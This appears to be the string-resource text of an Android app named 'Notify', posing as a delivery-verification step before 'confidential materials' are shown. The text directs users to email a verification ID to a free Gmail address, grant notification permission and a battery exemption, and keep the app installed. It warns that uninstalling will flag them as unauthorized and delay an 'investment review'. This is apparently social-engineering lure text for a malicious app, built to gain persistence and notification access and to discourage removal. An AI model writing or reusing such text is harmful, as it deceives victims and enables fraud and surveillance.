resources.string: Keeps Notify running in the background.

For security purposes, Notify verifies delivery of the app to the intended recipient before showing confidential materials. To verify, reply to swisspartnersgroupinfo@gmail.com and include the verification ID shown above. Verification typically completes within 1–2 business days. You can close the app — we will notify you automatically once access is granted.
To complete verification, Notify needs notification permission and battery exemption. Please grant both to continue.

Please keep Notify installed while verification is in progress. Uninstalling the app will reset your verification ID, which may cause the installation to be flagged as unauthorized, restrict access to the overview, and delay our investment review.
